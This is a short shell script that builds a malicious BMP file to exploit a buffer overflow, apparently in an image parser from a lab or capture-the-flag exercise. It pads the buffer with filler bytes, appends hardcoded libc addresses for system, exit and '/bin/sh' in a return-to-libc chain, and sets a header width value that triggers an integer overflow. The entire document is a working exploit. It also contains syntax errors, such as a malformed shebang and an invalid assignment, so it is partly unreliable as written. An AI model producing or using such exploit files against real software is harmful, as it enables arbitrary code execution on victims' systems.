#!bin/sh

buffer=$(printf '\x41%.0s' {1..1016}) #fill the buffer
ret_system="\x10\xcd\xe2\xf7"
exit="\x70\xff\xe1\xf7"
binsh="\xcf\xb8\xf6\xf7"

image = "$buffer$ret_system$exit$binsh"
checksum="\xd1\xc1\xda\xd5"

b_WIDTH="\x94\x01\x00\x80"  #WIDTH = 2**(31) + 404
b_LENGTH="\x01\x00\x00\x00" #LENGTH = 1

echo -en "$b_LENGTH$b_WIDTH$checksum$image" > file.bmp